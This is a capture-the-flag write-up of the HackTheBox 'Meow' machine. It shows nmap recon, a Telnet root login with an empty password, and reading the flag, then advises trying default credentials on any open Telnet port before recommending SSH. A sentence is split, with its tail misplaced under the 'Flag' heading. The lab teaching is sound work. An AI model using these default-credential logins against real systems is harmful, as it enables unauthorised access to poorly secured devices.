# Meow

**Platform:** HackTheBox — Starting Point  
**Category:** Network Fundamentals  
**OS:** Linux  
**Difficulty:** Very Easy  
**Date:** 2025  

---

## Summary
This machine exposed a Telnet service with no password set for the 
root account. After identifying the open port with Nmap, connecting 
via Telnet and logging in as root with no password gave immediate 
access to the system.

---

## Recon

```bash
nmap -sV -sC 10.129.X.X -oN nmap.txt
```

Nmap revealed port 23 open running Telnet. This is a legacy remote 
---

## Enumeration
Telnet requires minimal enumeration. The service was open and 
accepting connections. The next logical step was to attempt 
connection and try common default credentials, starting with root 
since this appeared to be a Linux system.

---

## Exploitation
Connected via Telnet and attempted login as root with no password. 
The system accepted the connection immediately without requiring 
any credentials.

```bash
telnet 10.129.X.X
# Trying 10.129.X.X...
# Connected to 10.129.X.X.
# login: root
# password: (empty — just pressed Enter)
```

Root access granted with no password.

---

## Post-Exploitation

```bash
whoami
# root

ls /root
# flag.txt

cat /root/flag.txt
```

---

## Flag
access protocol that transmits everything including credentials in 
cleartext — a significant security risk in any environment.

---

## Key Lesson
This machine demonstrates one of the most common misconfigurations 
found on legacy systems and IoT devices — Telnet left enabled with 
default or empty credentials. Unlike SSH, Telnet transmits all data 
including usernames and passwords in cleartext, meaning anyone on 
the same network can capture credentials with Wireshark.

In a real penetration test, finding port 23 open is an immediate 
priority. The first step is always trying default credentials 
(root/root, admin/admin, root with no password) before attempting 
brute force. This misconfiguration is still found regularly on old 
routers, industrial control systems, and network devices that have 
never been properly hardened.

The fix is simple — disable Telnet entirely and replace it with SSH, 
which encrypts all traffic and supports key-based authentication.
